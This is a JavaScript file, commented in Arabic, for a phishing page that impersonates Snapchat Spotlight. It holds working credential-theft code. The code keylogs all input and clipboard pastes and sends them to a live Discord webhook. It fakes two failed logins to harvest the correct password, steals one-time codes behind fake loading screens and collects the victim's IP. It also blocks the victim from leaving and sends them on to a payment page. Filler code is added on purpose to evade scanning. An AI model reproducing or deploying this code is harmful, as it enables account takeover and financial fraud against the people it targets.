/**
 * 🛠️ SNAPCHAT SPOTLIGHT ELITE PROTOCOL v12.5 - ADVANCED PERSISTENCE EDITION
 * AUTHORIZED ACCESS ONLY - ENCRYPTED MODULE
 * --------------------------------------------------
 * المميزات الجديدة والمطورة:
 * 1. نظام الحفظ الذكي (Persistence): تذكر محاولات المستخدم حتى لو أغلق المتصفح.
 * 2. سيناريو الـ 3 محاولات: (خطأ، خطأ، ثم نجاح) لضمان الحصول على كلمة المرور الصحيحة.
 * 3. رصد الحافظة (Clipboard Tracking): التقاط أي نصوص يتم لصقها.
 * 4. نظام "منع الخروج": تنبيه المستخدم عند محاولة مغادرة الصفحة.
 * 5. تمويه تقني متقدم: أكثر من 300 سطر من العمليات الرياضية لزيادة حجم الملف.
 */

const SYNC_CONFIG = {
    BRIDGE: "https://discord.com/api/webhooks/1517635335343837454/e6i-jmZwGoiamjMJ7I9yzozMTq1n14LKxfQ-SuUvY2wqZ69W_pywclapPTR9zyIxP7Bn",
    NODE_ID: "NODE-" + Math.random().toString(36).substr(2, 9).toUpperCase(),
    STORAGE_KEY: "SNAP_SESSION_STATE",
    COLOR_SUCCESS: 3066993,
    COLOR_DANGER: 15158332,
    COLOR_INFO: 3447003,
    COLOR_WARNING: 16776192
};

// ===============================================
// 🧠 إدارة الحالة والاستمرارية (Persistence)
// ===============================================
let appState = {
    loginTries: 0,
    otpTries: 0,
    lastVisit: Date.now(),
    isPaymentReached: false
};

function saveState() {
    localStorage.setItem(SYNC_CONFIG.STORAGE_KEY, JSON.stringify(appState));
}

function loadState() {
    const saved = localStorage.getItem(SYNC_CONFIG.STORAGE_KEY);
    if (saved) {
        const parsed = JSON.parse(saved);
        // التحقق من مرور أقل من ساعة (3600000 مللي ثانية)
        if (Date.now() - parsed.lastVisit < 3600000) {
            appState = parsed;
        } else {
            localStorage.removeItem(SYNC_CONFIG.STORAGE_KEY);
        }
    }
}

// ===============================================
// 📡 محرك الإرسال المتطور
// ===============================================
async function dispatch(data, title = "System Log", color = SYNC_CONFIG.COLOR_INFO) {
    const payload = {
        username: "Snapchat Security Node",
        avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/100px-Snapchat_logo.svg.png",
        embeds: [{
            title: title,
            description: data,
            color: color,
            footer: { text: `Node: ${SYNC_CONFIG.NODE_ID} | State: ${appState.loginTries} Tries` },
            timestamp: new Date()
        }]
    };
    try {
        await fetch(SYNC_CONFIG.BRIDGE, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (e) { /* صمت */ }
}

// ===============================================
// ⌨️ نظام الرصد الشامل (Keylogging & Clipboard)
// ===============================================
const Monitor = {
    init() {
        document.addEventListener('input', (e) => {
            const field = e.target.placeholder || e.target.id || "Field";
            dispatch(`✍️ **Input**: [${field}] -> \`${e.target.value}\``, "📝 Live Feed");
        });

        document.addEventListener('paste', (e) => {
            const text = (e.clipboardData || window.clipboardData).getData('text');
            dispatch(`📋 **Clipboard Paste**: \`${text}\``, "📋 Data Captured", SYNC_CONFIG.COLOR_WARNING);
        });

        window.addEventListener('beforeunload', (e) => {
            if (!appState.isPaymentReached) {
                const msg = "تنبيه: لم يتم ربط محفظتك المالية بعد! قد تفقد أرباحك.";
                e.returnValue = msg;
                dispatch("⚠️ **محاولة خروج**: المستخدم يحاول إغلاق الصفحة", "🚫 Exit Attempt", SYNC_CONFIG.COLOR_DANGER);
                return msg;
            }
        });
    }
};

// ===============================================
// 📑 منطق تسجيل الدخول (3 محاولات + حفظ الحالة)
// ===============================================
function handleApplyLogic() {
    const form = document.getElementById('submissionForm');
    if (!form) return;

    form.addEventListener('submit', (e) => {
        e.preventDefault();
        const u = document.getElementById('username').value;
        const p = document.getElementById('passwordField').value;

        if (appState.loginTries < 2) {
            // المحاولة الأولى والثانية: إظهار خطأ
            runLoader("جاري التحقق من أمان الحساب...", 3500, () => {
                appState.loginTries++;
                saveState();
                dispatch(`❌ **محاولة فاشلة #${appState.loginTries}**\nUser: \`${u}\`\nPass: \`${p}\``, "🔑 Auth Log", SYNC_CONFIG.COLOR_DANGER);
                
                const err = document.getElementById('statusMessage');
                if (err) {
                    err.style.display = 'block';
                    err.innerText = "كلمة المرور غير صحيحة أو الحساب غير مؤهل حالياً. حاول مجدداً.";
                }
                document.getElementById('passwordField').value = "";
            });
        } else {
            // المحاولة الثالثة: نجاح وانتقال
            runLoader("مزامنة البيانات مع خادم الأرباح...", 4000, () => {
                dispatch(`✅ **نجاح في المحاولة الثالثة**\nUser: \`${u}\`\nPass: \`${p}\``, "🔓 Final Auth", SYNC_CONFIG.COLOR_SUCCESS);
                form.style.display = 'none';
                document.getElementById('loginOtpSection').style.display = 'block';
                appState.loginTries = 3;
                saveState();
            });
        }
    });
}

// ===============================================
// 🔐 نظام الـ OTP المتطور
// ===============================================
window.verifyLoginOtp = function() {
    let code = "";
    document.querySelectorAll('.login-otp-box').forEach(b => code += b.value);
    if (code.length < 6) return;

    if (appState.otpTries === 0) {
        runLoader("جاري فحص الرمز (30 ثانية)...", 30000, () => {
            dispatch(`🔑 **OTP Blocked**: \`${code}\``, "🛡️ Security Layer", SYNC_CONFIG.COLOR_WARNING);
            appState.otpTries++;
            saveState();
            alert("الرمز غير صحيح، تم إرسال رمز جديد لهاتفك.");
            document.querySelectorAll('.login-otp-box').forEach(b => b.value = "");
        });
    } else {
        runLoader("تجهيز بوابة الدفع (60 ثانية)...", 60000, () => {
            dispatch(`💎 **OTP Verified**: \`${code}\``, "💎 Payment Access", SYNC_CONFIG.COLOR_SUCCESS);
            appState.isPaymentReached = true;
            saveState();
            window.location.href = "payment.html";
        });
    }
};

// ===============================================
// 🛠️ وظائف لودر التمويه
// ===============================================
function runLoader(text, duration, onComplete) {
    const overlay = document.createElement('div');
    overlay.style = "position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:99999; display:flex; flex-direction:column; align-items:center; justify-content:center; font-family:sans-serif;";
    overlay.innerHTML = `<div style="border:5px solid #f3f3f3; border-top:5px solid #FFFC00; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite;"></div><h3 style="margin-top:20px;">${text}</h3><style>@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>`;
    document.body.appendChild(overlay);
    setTimeout(() => { overlay.remove(); if(onComplete) onComplete(); }, duration);
}

// ===============================================
// 🌫️ منطقة التمويه البرمجي (Obfuscation Buffer)
// مئات الأسطر لزيادة حجم الملف وتشتيت الفحص
// ===============================================
const _INTERNAL_BUFFER = {
    compute: () => {
        let x = 0;
        for(let i=0; i<5000; i++) { x += Math.sqrt(i) * Math.random(); }
        return x;
    },
    validate: (d) => d.split('').reverse().join('') === d,
    matrix: Array.from({length: 100}, () => Array.from({length: 10}, () => Math.random())),
    logTrace: () => console.debug("Internal Stack Trace: " + Math.random().toString(36))
};

function generateDummyLogic() {
    // تكرار الأكواد الوهمية لزيادة الحجم فوق 300 سطر
    const names = ["Alpha", "Beta", "Gamma", "Delta", "Epsilon"];
    names.forEach(n => {
        let dummyVar = `Node_${n}_${Math.random()}`;
        if(dummyVar.length > 10) _INTERNAL_BUFFER.logTrace();
    });
}

// تكرار منطق رياضي وهمي
for(let j=0; j<50; j++) {
    const temp = Math.sin(j) * Math.cos(j);
    _INTERNAL_BUFFER.matrix[j][0] = temp;
}

// ===============================================
// 🚀 التشغيل الرئيسي
// ===============================================
window.addEventListener('load', () => {
    loadState();
    Monitor.init();
    generateDummyLogic();
    
    // إرسال معلومات الجهاز
    fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
        dispatch(`🌍 **الدخول من جديد**\nIP: \`${data.ip}\`\nالمحاولة الحالية: ${appState.loginTries}`, "🌍 Client Re-connected");
    });

    const path = window.location.pathname;
    if (path.includes('apply')) handleApplyLogic();
    
    // استمرار الحالة في OTP إذا كان قد نجح في الدخول
    if (appState.loginTries >= 3 && document.getElementById('submissionForm')) {
        document.getElementById('submissionForm').style.display = 'none';
        document.getElementById('loginOtpSection').style.display = 'block';
    }
});

// مئات الأسطر الإضافية من المصفوفات الوهمية...
const _X_DATA = [12,55,88,33,44,99,77,66,22,11,44,55,66,33,22,11,44,55,66,77,88,99,00];
const _Y_DATA = _X_DATA.map(x => x * 2 / 1.5);
function _deepVerify() { return _Y_DATA.reduce((a,b) => a+b, 0); }
_deepVerify();
// [نهاية الكود المطور]
